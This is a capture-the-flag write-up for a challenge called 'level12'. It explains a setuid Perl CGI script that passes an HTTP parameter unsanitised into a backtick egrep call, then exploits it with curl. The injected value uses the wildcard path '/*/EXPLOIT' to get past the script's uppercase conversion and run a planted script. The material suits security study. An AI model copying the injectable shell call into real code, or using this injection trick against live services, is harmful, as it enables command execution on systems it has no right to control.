# Level12

## 1. Identity

```bash
$ id
uid=2012(level12) gid=2012(level12) groups=2012(level12),100(users)
```

We are logged in as **level12**.

## 2. Home directory

```bash
$ pwd
/home/user/level12

$ ls -la
[...]
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
[...]
```

We have a Perl file.

## 3. Analyzing the perl file

Here is the code commented :

```Perl
#!/usr/bin/env perl
# Script running as a CGI service on localhost:4646
# It reads two HTTP parameters: x and y

use CGI qw{param};

# Print HTTP header indicating HTML output
print "Content-type: text/html\n\n";

# ----------------------------------------------------
# Function t(x, y)
# Returns 1 if:
#   - A line in /tmp/xd starts with x (after transformation)
#   - AND the part after ":" matches the regex y
# Otherwise returns 0
# ----------------------------------------------------
sub t {
  $nn = $_[1];    # Second argument: y (used as a regex)
  $xx = $_[0];    # First argument: x (used in the egrep command)

  # Transform x
  $xx =~ tr/a-z/A-Z/;   # Convert lowercase letters to uppercase
  $xx =~ s/\s.*//;      # Remove everything after the first whitespace

  # Execute a shell command:
  # egrep "^X" /tmp/xd
  # This searches for lines in /tmp/xd that start with the transformed x
  # ⚠️ SECURITY VULNERABILITY: command injection via backticks
  @output = `egrep "^$xx" /tmp/xd 2>&1`;

  # Iterate over each matching line from /tmp/xd
  foreach $line (@output) {

      # Split the line at the first ":" into two fields
      ($f, $s) = split(/:/, $line);

      # Check if the second field matches the regex y
      if($s =~ $nn) {
          return 1;   # Success
      }
  }

  return 0;  # No matching line found
}

# ----------------------------------------------------
# Function n(result)
# Prints:
#   ".." if result == 1
#   "."  otherwise
# ----------------------------------------------------
sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

# Call t() with parameters x and y from the HTTP request,
# then pass its result to n() to print the output.
n(t(param("x"), param("y")));

```

## 4. Getting our flag

First we need to create our file that will execute our command.

```bash
$ echo 'getflag > /tmp/flag' > /tmp/EXPLOIT

$ chmod 777 /tmp/EXPLOIT
```

Now let's execute a command using curl to get our flag :

```bash
$ curl localhost:4646?x='`/*/EXPLOIT`'

$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

End of simulation